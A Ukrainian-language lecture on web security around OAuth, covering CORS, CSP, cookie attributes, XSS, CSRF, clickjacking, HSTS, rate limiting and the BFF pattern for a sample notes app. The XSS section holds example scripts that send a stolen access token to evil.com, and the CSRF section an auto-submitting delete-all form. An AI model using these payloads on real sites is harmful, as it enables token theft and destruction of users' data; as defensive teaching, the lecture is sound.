# Лекція 12. Безпека веб-додатків навколо OAuth

## Зміст

1. [OAuth — не вся безпека](#1-oauth--не-вся-безпека)
2. [CORS (Cross-Origin Resource Sharing)](#2-cors-cross-origin-resource-sharing)
3. [CSP (Content Security Policy)](#3-csp-content-security-policy)
4. [Cookies: Secure, HttpOnly, SameSite](#4-cookies-secure-httponly-samesite)
5. [XSS та крадіжка токенів](#5-xss-та-крадіжка-токенів)
6. [CSRF — повторення та поглиблення](#6-csrf--повторення-та-поглиблення)
7. [Clickjacking](#7-clickjacking)
8. [HSTS (HTTP Strict Transport Security)](#8-hsts-http-strict-transport-security)
9. [Rate Limiting — захист від brute force](#9-rate-limiting--захист-від-brute-force)
10. [BFF Pattern (Backend for Frontend)](#10-bff-pattern-backend-for-frontend)
11. [Cookie vs localStorage](#11-cookie-vs-localstorage)
12. [Підсумки](#12-підсумки)

---

## 1. OAuth — не вся безпека

### Мотивація

У попередній лекції Максим Витребенько налаштував OAuth 2.0 з PKCE для свого додатку SecureNotes. Авторизація працює, токени видаються, API захищено. Здавалося б — місія виконана. Але OAuth — це лише **авторизаційний фреймворк**. Він відповідає на питання «хто має доступ?», але не захищає від цілого класу атак, що існують у веб-середовищі.

### Веб — це ворожий простір

Браузер за своєю природою виконує код із різних джерел: скрипти з CDN, аналітику, рекламні модулі, віджети. Кожен із цих скриптів потенційно може:

- Читати cookies та localStorage
- Надсилати HTTP-запити від імені користувача
- Модифікувати DOM-дерево сторінки
- Перехоплювати введення з клавіатури

OAuth-токен, що потрапив у руки зловмисного скрипта — це повний доступ до облікового запису жертви. Тому безпека веб-додатку — це **сукупність захисних механізмів**, а не лише правильний OAuth-потік.

### Що додає Максим

Максим додає web security headers до SecureNotes: CSP, CORS, Secure Cookies, Rate Limiting. У цій лекції ми розглянемо кожен із цих механізмів — чому він потрібен, як працює, і як Максим інтегрує його у свій додаток.

```
┌─────────────────────────────────────────────────────────┐
│                    SecureNotes                           │
│                                                         │
│  OAuth 2.0 + PKCE          ← Лекції 4-11                 │
│  ─────────────────                                      │
│  + CORS                    ← Хто може робити запити?    │
│  + CSP                     ← Які скрипти дозволені?     │
│  + Secure Cookies          ← Як зберігати токени?       │
│  + HSTS                    ← Примусовий HTTPS           │
│  + Rate Limiting           ← Захист від перебору        │
│  + BFF Pattern             ← Де живуть токени?          │
└─────────────────────────────────────────────────────────┘
```

---

## 2. CORS (Cross-Origin Resource Sharing)

### Same-Origin Policy — фундамент безпеки браузера

**Same-Origin Policy** (SOP) — це механізм безпеки, вбудований у кожен браузер. Він забороняє JavaScript-коду з одного джерела (origin) отримувати доступ до ресурсів іншого джерела. **Origin** визначається трійкою: **схема + хост + порт**.

```
https://notes.example.com:443
  │          │              │
  схема      хост           порт
```

Приклади:

| Origin A | Origin B | Однаковий origin? |
|---|---|---|
| `https://notes.example.com` | `https://notes.example.com/api` | Так |
| `https://notes.example.com` | `http://notes.example.com` | Ні (схема) |
| `https://notes.example.com` | `https://api.example.com` | Ні (хост) |
| `https://notes.example.com` | `https://notes.example.com:8080` | Ні (порт) |

Без SOP будь-який сайт міг би зробити `fetch('https://bank.com/api/transfer')` і прочитати відповідь — з cookies жертви. SOP цього не дозволяє.

### Проблема: легітимні крос-доменні запити

Максим розділив SecureNotes на SPA-фронтенд (`https://notes.example.com`) та API-бекенд (`https://api.example.com`). SOP блокує запити фронтенда до API, бо хости різні. Потрібен механізм, який **дозволяє** конкретним origin'ам робити крос-доменні запити.

### CORS — контрольоване послаблення SOP

**CORS** (Cross-Origin Resource Sharing) — це протокол, який дозволяє серверу вказати, які origin'и мають доступ до його ресурсів. Сервер повертає спеціальні HTTP-заголовки у відповіді.

### Preflight-запити

Перед «небезпечними» запитами (методи PUT, DELETE, або запити з нестандартними заголовками) браузер автоматично відправляє **preflight-запит** методом `OPTIONS`:

```
Браузер                                 Сервер
   │                                      │
   │  OPTIONS /api/notes                  │
   │  Origin: https://notes.example.com   │
   │  Access-Control-Request-Method: PUT  │
   │  Access-Control-Request-Headers:     │
   │    Authorization, Content-Type       │
   │──────────────────────────────────────→│
   │                                      │
   │  200 OK                              │
   │  Access-Control-Allow-Origin:        │
   │    https://notes.example.com         │
   │  Access-Control-Allow-Methods:       │
   │    GET, POST, PUT, DELETE            │
   │  Access-Control-Allow-Headers:       │
   │    Authorization, Content-Type       │
   │  Access-Control-Max-Age: 3600        │
   │←──────────────────────────────────────│
   │                                      │
   │  PUT /api/notes/42  (основний запит) │
   │──────────────────────────────────────→│
```

### Налаштування CORS для SecureNotes (Python / Flask)

```python
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)

CORS(app, resources={
    r"/api/*": {
        "origins": ["https://notes.example.com"],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Authorization", "Content-Type"],
        "max_age": 3600
    }
})
```

### Типові помилки

- `Access-Control-Allow-Origin: *` — дозволяє **всім** сайтам робити запити до API. Небезпечно для API з автентифікацією
- `Access-Control-Allow-Origin: *` разом з `Access-Control-Allow-Credentials: true` — браузер заблокує таку відповідь, бо стандарт це забороняє
- Відображення (reflection) Origin-заголовка з запиту без валідації — фактично те саме, що `*`

---

## 3. CSP (Content Security Policy)

### Проблема: впровадження стороннього коду

Навіть із правильно налаштованим CORS зловмисник може впровадити шкідливий скрипт безпосередньо на сторінку — через XSS-вразливість, компрометований CDN або шкідливе розширення браузера. Потрібен механізм, який обмежує, **які скрипти дозволено виконувати** на сторінці.

### Що таке CSP

**Content Security Policy** (CSP) — це HTTP-заголовок, який дозволяє серверу вказати браузеру, з яких джерел дозволено завантажувати різні типи ресурсів (скрипти, стилі, зображення, шрифти, фрейми тощо).

### Основні директиви

| Директива | Що контролює | Приклад |
|---|---|---|
| `default-src` | Джерело за замовчуванням для всіх типів | `'self'` |
| `script-src` | JavaScript-скрипти | `'self' https://cdn.example.com` |
| `style-src` | CSS-стилі | `'self' 'unsafe-inline'` |
| `img-src` | Зображення | `'self' data: https:` |
| `connect-src` | Цілі для fetch/XHR/WebSocket | `'self' https://api.example.com` |
| `frame-src` | Вміст iframe | `'none'` |
| `font-src` | Шрифти | `'self' https://fonts.gstatic.com` |
| `object-src` | Плагіни (Flash, Java) | `'none'` |
| `base-uri` | Обмеження для `<base>` тега | `'self'` |
| `form-action` | Цілі для `<form action>` | `'self'` |

### CSP для SecureNotes

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self'
```

Ця політика означає: завантажувати скрипти, стилі, зображення лише з власного домену; API-запити дозволені лише до `api.example.com`; вбудовування у фрейми заборонене; Flash/Java заборонені.

### Приклад на Python (Flask)

```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self'; "
        "connect-src 'self' https://api.example.com; "
        "frame-ancestors 'none'; "
        "object-src 'none'; "
        "base-uri 'self'"
    )
    return response
```

### CSP у режимі report-only

Перед увімкненням CSP у блокуючому режимі можна спочатку запустити його у **report-only** — він не блокуватиме ресурси, лише надсилатиме звіти про порушення:

```
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri /csp-report
```

Це дозволяє виявити всі легітимні ресурси, які потрібно дозволити, перш ніж увімкнути повне блокування.

---

## 4. Cookies: Secure, HttpOnly, SameSite

### Навіщо потрібні атрибути cookies

Cookies — один з основних механізмів збереження стану у вебі. Токени сесій, refresh-токени, ідентифікатори — все це часто зберігається у cookies. Без правильних атрибутів cookie доступний зловмисному JavaScript-коду, передається через незахищені з'єднання та надсилається з крос-доменними запитами.

### Атрибут Secure

Cookie з атрибутом `Secure` передається **лише через HTTPS**. Без цього атрибута cookie може бути перехоплений при передачі через незахищене HTTP-з'єднання (наприклад, у публічній Wi-Fi мережі).

### Атрибут HttpOnly

Cookie з атрибутом `HttpOnly` **недоступний для JavaScript** через `document.cookie`. Браузер автоматично додає такий cookie до HTTP-запитів, але JavaScript не може його прочитати, змінити або видалити.

Це критично для захисту від XSS: навіть якщо зловмисник впровадить скрипт на сторінку, він не зможе викрасти HttpOnly-cookie.

### Атрибут SameSite

Атрибут `SameSite` контролює, чи надсилається cookie з **крос-сайтовими запитами**:

| Значення | Поведінка |
|---|---|
| `Strict` | Cookie надсилається **лише** при навігації з того самого сайту. Не надсилається при переході з іншого сайту навіть за посиланням |
| `Lax` | Cookie надсилається при top-level навігації (GET-посилання), але **не** при крос-сайтових POST, iframe, fetch |
| `None` | Cookie надсилається завжди. Вимагає `Secure` атрибут. Використовується для легітимних крос-доменних сценаріїв |

### Приклад встановлення cookie

```python
from flask import make_response

@app.route('/login', methods=['POST'])
def login():
    response = make_response({"status": "ok"})
    response.set_cookie(
        'session_id',
        value=session_token,
        httponly=True,      # недоступний для JS
        secure=True,        # лише через HTTPS
        samesite='Lax',     # не надсилається з крос-сайтових POST
        max_age=3600,       # TTL 1 година
        path='/'
    )
    return response
```

### Як це працює разом

```
┌─────────────────────────────────────────────────────┐
│   Set-Cookie: session=abc123;                       │
│     Secure;            ← лише HTTPS                 │
│     HttpOnly;          ← недоступний для JS          │
│     SameSite=Lax;      ← не йде з крос-сайт POST   │
│     Max-Age=3600;      ← живе 1 годину              │
│     Path=/                                          │
└─────────────────────────────────────────────────────┘
                         │
        ┌────────────────┼────────────────┐
        │                │                │
   XSS-атака        CSRF POST       HTTP sniffing
   (document.cookie)  (з evil.com)    (Wi-Fi перехоплення)
        │                │                │
     BLOCKED          BLOCKED          BLOCKED
```

---

## 5. XSS та крадіжка токенів

### Що таке XSS

**XSS** (Cross-Site Scripting) — це атака, при якій зловмисник впроваджує шкідливий JavaScript-код у веб-сторінку, яку бачить жертва. Цей код виконується **у контексті довіреного сайту**, тому має доступ до cookies (не HttpOnly), localStorage, DOM та може робити запити від імені користувача.

### Три типи XSS

**Stored XSS** (збережений) — зловмисник зберігає шкідливий скрипт у базі даних додатку (наприклад, у коментарі, профілі, нотатці). Кожен користувач, який переглядає цей контент, виконує скрипт.

```
Зловмисник зберігає нотатку в SecureNotes:

<script>
  fetch('https://evil.com/steal?token='
    + localStorage.getItem('access_token'));
</script>

Інший користувач відкриває нотатку → скрипт виконується →
токен відправляється зловмиснику.
```

**Reflected XSS** (відображений) — шкідливий скрипт передається через URL-параметр і відображається на сторінці без належного екранування:

```
https://notes.example.com/search?q=<script>alert('XSS')</script>
```

Якщо сервер вставляє параметр `q` безпосередньо у HTML без екранування, скрипт виконається.

**DOM-based XSS** — вразливість виникає на стороні клієнта, коли JavaScript-код використовує ненадійні дані (наприклад, `location.hash`, `document.referrer`) для модифікації DOM без екранування.

```javascript
// Вразливий код
document.getElementById('output').innerHTML = location.hash.slice(1);

// Атака
// https://notes.example.com/#<img src=x onerror=alert('XSS')>
```

### Як XSS краде токени з localStorage

Якщо access_token зберігається у `localStorage`, будь-який JavaScript-код на сторінці може його прочитати:

```javascript
// Зловмисний скрипт, впроваджений через XSS
const token = localStorage.getItem('access_token');

// Надсилання токена зловмиснику
fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify({ token: token })
});

// Або виконання запитів від імені жертви
fetch('https://api.example.com/notes', {
    headers: { 'Authorization': 'Bearer ' + token }
});
```

### Захист від XSS

1. **Екранування виводу** (output encoding) — завжди екрануйте дані при вставці у HTML, JavaScript, CSS, URL
2. **CSP** — `script-src 'self'` блокує виконання inline-скриптів
3. **HttpOnly cookies** — навіть при XSS зловмисник не прочитає cookie
4. **Не зберігайте токени у localStorage** — це доступно будь-якому JS-коду на сторінці

```python
# Flask: автоматичне екранування в шаблонах (Jinja2)
# Jinja2 екранує за замовчуванням:
# {{ user_input }} → &lt;script&gt;alert('XSS')&lt;/script&gt;

# НЕБЕЗПЕЧНО: вимкнення екранування
# {{ user_input | safe }}  ← НІКОЛИ не робіть це з ненадійними даними
```

---

## 6. CSRF — повторення та поглиблення

### Що таке CSRF

**CSRF** (Cross-Site Request Forgery) — це атака, при якій зловмисний сайт змушує браузер жертви надіслати запит до довіреного сайту з cookies жертви. На відміну від XSS, зловмисник **не бачить відповідь** — але може виконати дію від імені жертви.

### Сценарій атаки

Максим Витребенько залогінений у SecureNotes. Його session cookie автоматично додається до кожного запиту. Зловмисник створює сторінку:

```html
<!-- evil.com -->
<form action="https://api.example.com/notes/delete-all"
      method="POST" id="csrf-form">
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

Якщо Максим відкриє `evil.com`, браузер автоматично надішле POST-запит до SecureNotes **з cookies Максима** — і всі нотатки будуть видалені.

### Як SameSite cookies захищають від CSRF

```
Запит із evil.com → notes.example.com:

SameSite=Strict: cookie НЕ надсилається              → CSRF неможливий
SameSite=Lax:    cookie НЕ надсилається (POST/fetch)  → CSRF неможливий
SameSite=None:   cookie надсилається                  → CSRF можливий!
```

`SameSite=Lax` — це **мінімально рекомендоване** значення. Для критичних дій (видалення, переказ коштів) рекомендується `SameSite=Strict`.

### CSRF-токени як додатковий захист

SameSite cookies — це перша лінія захисту, але для критичних додатків варто додати CSRF-токени:

```python
import secrets

@app.route('/form')
def show_form():
    csrf_token = secrets.token_hex(32)
    session['csrf_token'] = csrf_token
    return render_template('form.html', csrf_token=csrf_token)

@app.route('/action', methods=['POST'])
def perform_action():
    if request.form.get('csrf_token') != session.get('csrf_token'):
        abort(403, 'Invalid CSRF token')
    # виконати дію
```

### CSRF та OAuth

У контексті OAuth 2.0 параметр `state` у Authorization Request виконує функцію CSRF-токена: він прив'язує запит на авторизацію до конкретної сесії користувача. Якщо зловмисник ініціює OAuth-потік і підставить свій authorization code жертві — параметр `state` не збігатиметься, і підміна буде виявлена.

---

## 7. Clickjacking

### Що таке clickjacking

**Clickjacking** (UI Redressing) — атака, при якій зловмисник накладає прозорий iframe з довіреним сайтом поверх власної сторінки. Жертва думає, що клікає кнопку на сайті зловмисника, а насправді клікає елемент на довіреному сайті (наприклад, «Видалити акаунт» або «Підтвердити переказ»).

```
┌──────────────────────────────────────┐
│       Сторінка зловмисника           │
│                                      │
│   "Натисніть, щоб виграти приз!"     │
│          ┌──────────┐                │
│          │ ВИГРАТИ! │  ← видима      │
│          └──────────┘   кнопка       │
│                                      │
│  ┌───────────────────────────────┐   │
│  │  (прозорий iframe)            │   │
│  │  SecureNotes: [Видалити все]  │   │  ← невидима
│  │                               │   │    кнопка
│  └───────────────────────────────┘   │
│                                      │
└──────────────────────────────────────┘

Клік потрапляє на "Видалити все" замість "ВИГРАТИ!"
```

### Захист: X-Frame-Options

Заголовок `X-Frame-Options` контролює, чи можна завантажити сторінку у фреймі:

```
X-Frame-Options: DENY           # заборонити вбудовування будь-де
X-Frame-Options: SAMEORIGIN     # дозволити лише з того самого origin
```

### Захист: CSP frame-ancestors

Сучасний аналог `X-Frame-Options` — директива `frame-ancestors` у CSP:

```
Content-Security-Policy: frame-ancestors 'none'    # аналог DENY
Content-Security-Policy: frame-ancestors 'self'    # аналог SAMEORIGIN
Content-Security-Policy: frame-ancestors https://trusted.example.com
```

`frame-ancestors` у CSP — це **рекомендований підхід**, оскільки він гнучкіший і підтримується всіма сучасними браузерами. `X-Frame-Options` залишається для зворотної сумісності.

### Налаштування для SecureNotes

```python
@app.after_request
def set_frame_protection(response):
    response.headers['X-Frame-Options'] = 'DENY'
    # CSP frame-ancestors вже встановлено в CSP-заголовку
    return response
```

---

## 8. HSTS (HTTP Strict Transport Security)

### Проблема: SSL Stripping

Навіть якщо сервер має HTTPS, перший запит користувача може йти через HTTP — особливо коли користувач вводить `notes.example.com` у адресний рядок без `https://`. Атакуючий у тій самій мережі (наприклад, у кафе через публічну Wi-Fi) може перехопити цей HTTP-запит і виконати **SSL Stripping** атаку: проксувати з'єднання, представляючись сервером через HTTP, а сам спілкуватися із сервером через HTTPS.

```
Жертва                  Атакуючий               Сервер
   │                       │                       │
   │  HTTP (незахищено)    │  HTTPS (захищено)     │
   │──────────────────────→│──────────────────────→│
   │                       │                       │
   │  Жертва бачить HTTP   │  Атакуючий бачить     │
   │  (без замочка)        │  все відкритим текстом │
```

### Що таке HSTS

**HSTS** (HTTP Strict Transport Security) — це HTTP-заголовок, який наказує браузеру **завжди** використовувати HTTPS для цього домену. Після першого відвідування сайту з HSTS-заголовком браузер ніколи не надсилатиме HTTP-запити до цього домену — усі запити автоматично перенаправляються на HTTPS **на стороні браузера**, ще до відправки.

### Заголовок HSTS

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- `max-age=31536000` — браузер пам'ятає HSTS 1 рік (у секундах)
- `includeSubDomains` — поширюється на всі піддомени
- `preload` — домен може бути доданий до вбудованого списку браузера (HSTS Preload List), що захищає навіть перший запит

### Приклад на Python (Flask)

```python
@app.after_request
def set_hsts(response):
    response.headers['Strict-Transport-Security'] = (
        'max-age=31536000; includeSubDomains; preload'
    )
    return response
```

### Перевірка з командного рядка

```bash
curl -I https://notes.example.com | grep -i strict
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

---

## 9. Rate Limiting — захист від brute force

### Проблема

Без обмежень на кількість запитів зловмисник може:

- **Brute force паролів** — перебирати тисячі паролів на секунду через форму логіну
- **Token guessing** — намагатися вгадати access/refresh токени
- **Credential stuffing** — використовувати вкрадені пари email/пароль з інших сервісів
- **DoS** — перевантажити сервер надмірною кількістю запитів

### Стратегії Rate Limiting

| Стратегія | Обмеження на | Приклад |
|---|---|---|
| Per-IP | IP-адресу | 100 запитів/хв з одного IP |
| Per-User | обліковий запис | 5 спроб логіну / 15 хв |
| Per-Endpoint | конкретний маршрут | 10 POST /login / хв |
| Sliding Window | ковзне вікно часу | рівномірний розподіл |

### Приклад: Flask-Limiter

```python
from flask import Flask
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # ... автентифікація
    pass

@app.route('/api/notes')
@limiter.limit("100 per minute")
def get_notes():
    # ... отримання нотаток
    pass
```

### HTTP-відповідь при перевищенні ліміту

```
HTTP/1.1 429 Too Many Requests
Retry-After: 60
Content-Type: application/json

{
  "error": "rate_limit_exceeded",
  "message": "Too many login attempts. Try again in 60 seconds."
}
```

### Заголовки Rate Limit

Хорошою практикою є повертати інформацію про ліміти у заголовках відповіді:

```
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 42
X-RateLimit-Reset: 1672531260
```

### Rate Limiting та OAuth

У контексті OAuth особливо важливо обмежити:

- **Token endpoint** (`/oauth/token`) — захист від brute force refresh-токенів
- **Authorization endpoint** — захист від автоматизованих запитів авторизації
- **Introspection endpoint** — захист від масового перебору токенів

---

## 10. BFF Pattern (Backend for Frontend)

### Проблема: де зберігати токени у SPA?

У класичному SPA (Single Page Application) OAuth-токени зберігаються на клієнті — у `localStorage` або `sessionStorage`. Як ми бачили у розділі про XSS, будь-який JavaScript-код на сторінці може прочитати ці токени. Навіть із CSP ризик залишається: одна XSS-вразливість — і всі токени скомпрометовані.

### Ідея BFF

**BFF** (Backend for Frontend) — це архітектурний паттерн, при якому між SPA та OAuth-сервером стоїть **легкий бекенд-шар**, який:

1. Виконує OAuth-потік на стороні сервера (Authorization Code Flow, без PKCE у браузері)
2. Зберігає access/refresh токени **на сервері**, у сесії
3. Видає клієнту лише **session cookie** (HttpOnly, Secure, SameSite)

```
┌───────────┐     cookie       ┌───────────┐   access_token   ┌───────────┐
│           │ ────────────────→ │           │ ────────────────→ │           │
│  Браузер  │                   │  BFF      │                   │  API      │
│  (SPA)    │ ←──────────────── │  (сервер) │ ←──────────────── │  Server   │
│           │     HTML/JSON     │           │     JSON          │           │
└───────────┘                   └───────────┘                   └───────────┘
                                      │
                                      │ refresh_token
                                      │ (зберігається на сервері)
                                      ▼
                                ┌───────────┐
                                │  OAuth    │
                                │  Server   │
                                └───────────┘
```

### Переваги BFF

- **Токени недоступні для JavaScript** — у браузері лише HttpOnly session cookie
- **Refresh-токен ніколи не потрапляє у браузер** — оновлення відбувається на сервері
- **Менша поверхня атаки** — навіть при XSS зловмисник не отримує OAuth-токени
- **Серверна сесія** — легше інвалідувати доступ (видалити серверну сесію)

### Коли використовувати BFF

| Сценарій | Рекомендація |
|---|---|
| Публічний SPA з чутливими даними | BFF рекомендований |
| Внутрішній інструмент у довіреній мережі | PKCE може бути достатнім |
| Mobile додаток | PKCE (нема сенсу у BFF) |
| SSR (серверний рендеринг) | Токени вже на сервері |

### Спрощений приклад BFF (Flask)

```python
from flask import Flask, session, redirect, request
import requests

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

@app.route('/auth/callback')
def oauth_callback():
    code = request.args.get('code')

    # Обмін коду на токени — на стороні сервера
    token_response = requests.post('https://auth.example.com/token', data={
        'grant_type': 'authorization_code',
        'code': code,
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'redirect_uri': REDIRECT_URI
    })

    tokens = token_response.json()

    # Зберігаємо токени у серверній сесії — НЕ у браузері
    session['access_token'] = tokens['access_token']
    session['refresh_token'] = tokens['refresh_token']

    return redirect('/')

@app.route('/api/notes')
def proxy_notes():
    # BFF проксує запит до API, додаючи токен із серверної сесії
    access_token = session.get('access_token')
    response = requests.get('https://api.example.com/notes', headers={
        'Authorization': f'Bearer {access_token}'
    })
    return response.json()
```

---

## 11. Cookie vs localStorage

### Порівняння для зберігання токенів

| Критерій | localStorage | Cookie (HttpOnly + Secure + SameSite) |
|---|---|---|
| Доступний для JS | **Так** — будь-який скрипт читає | **Ні** — недоступний для JS |
| XSS-стійкість | **Вразливий** — токен крадуть одним рядком | **Стійкий** — JS не бачить cookie |
| CSRF-стійкість | **Стійкий** — не надсилається автоматично | **Потребує SameSite** — інакше вразливий |
| Розмір | ~5-10 МБ | ~4 КБ на cookie |
| Серверний доступ | Потрібен JS для додавання до запиту | Автоматично додається браузером |
| Термін дії | Немає вбудованого TTL | `Max-Age` / `Expires` |
| Працює між вкладками | Так | Так |

### Рекомендації

```
                    Зберігання токенів: дерево рішень

                         ┌──────────────┐
                         │  Є бекенд?   │
                         └──────┬───────┘
                           так  │  ні
                    ┌───────────┤
                    ▼           ▼
              ┌──────────┐ ┌───────────────────┐
              │   BFF    │ │ SPA без бекенду   │
              │ pattern  │ │ (лише фронтенд)   │
              └────┬─────┘ └────────┬──────────┘
                   │                │
                   ▼                ▼
            HttpOnly cookie    localStorage +
            (токени на          PKCE + CSP +
             сервері)           короткий TTL
                   │                │
                   ▼                ▼
              НАЙКРАЩИЙ         ПРИЙНЯТНИЙ
              варіант           варіант
```

### Практичне правило

- **Є можливість використати BFF** — зберігайте токени на сервері, видавайте HttpOnly session cookie
- **Немає бекенду** (чисте SPA) — використовуйте localStorage з PKCE, але **обов'язково** налаштуйте CSP, мінімізуйте TTL access-токена, та використовуйте Token Rotation для refresh-токенів
- **Ніколи** не зберігайте токени у звичайних (не HttpOnly) cookies — це поєднує вразливості обох підходів

---

## 12. Підсумки

### Що ми розглянули

- **CORS** — контрольоване послаблення Same-Origin Policy для легітимних крос-доменних запитів
- **CSP** — обмеження джерел завантаження скриптів, стилів та інших ресурсів
- **Cookie-атрибути** — Secure, HttpOnly, SameSite як три рівні захисту
- **XSS** — впровадження шкідливого скрипта та крадіжка токенів з localStorage
- **CSRF** — крос-сайтові підроблені запити та захист через SameSite cookies і CSRF-токени
- **Clickjacking** — захист через X-Frame-Options та frame-ancestors CSP
- **HSTS** — примусовий HTTPS для захисту від SSL Stripping
- **Rate Limiting** — захист від brute force, credential stuffing, DoS
- **BFF Pattern** — зберігання токенів на сервері замість браузера
- **Cookie vs localStorage** — порівняння підходів до зберігання токенів

### Ключові висновки

1. OAuth — це лише авторизаційний фреймворк; повна безпека потребує **комплексу заходів**
2. **CSP + HttpOnly cookies** — найефективніший захист від XSS-крадіжки токенів
3. **SameSite=Lax** — мінімальний рівень захисту cookies від CSRF
4. **HSTS з preload** — захист від SSL Stripping, починаючи з першого запиту
5. **BFF pattern** — найбезпечніший підхід для зберігання OAuth-токенів у веб-додатках

### Чеклист безпеки SecureNotes (Максим Витребенько)

```
[x] CORS: дозволено лише notes.example.com
[x] CSP: script-src 'self', frame-ancestors 'none'
[x] Cookies: Secure + HttpOnly + SameSite=Lax
[x] X-Frame-Options: DENY
[x] HSTS: max-age=31536000; includeSubDomains; preload
[x] Rate Limiting: 5 спроб логіну / хв, 100 API запитів / хв
[x] BFF: токени на сервері, session cookie для клієнта
[x] CSP Report-Only: моніторинг порушень
```

### Що далі?

У наступній лекції ми проведемо **фінальний аудит безпеки** — Лекція 13: Проєктування безпечної системи. Підсумок.

Ми зберемо всі захисні механізми з усього курсу і проведемо повний security audit додатку SecureNotes:

- **Threat Modeling** — системний аналіз поверхні атаки
- **Penetration Testing** — практична перевірка вразливостей
- **Security Checklist** — комплексний чеклист для production-ready додатку
- **Incident Response** — план дій при інциденті безпеки

Від окремих механізмів захисту — до **цілісної стратегії безпеки**.

---

## Література

1. OWASP. *OWASP Top Ten.* — https://owasp.org/www-project-top-ten/
2. MDN Web Docs. *Content Security Policy (CSP).* — https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
3. MDN Web Docs. *Cross-Origin Resource Sharing (CORS).* — https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
4. MDN Web Docs. *SameSite cookies.* — https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
5. RFC 6797 — HTTP Strict Transport Security (HSTS)
6. Philippe De Ryck. *The BFF Pattern (Backend for Frontend).* — https://blog.duendesoftware.com/posts/20210326_bff/
7. OWASP. *Cross-Site Request Forgery Prevention Cheat Sheet.* — https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
8. OWASP. *Clickjacking Defense Cheat Sheet.* — https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
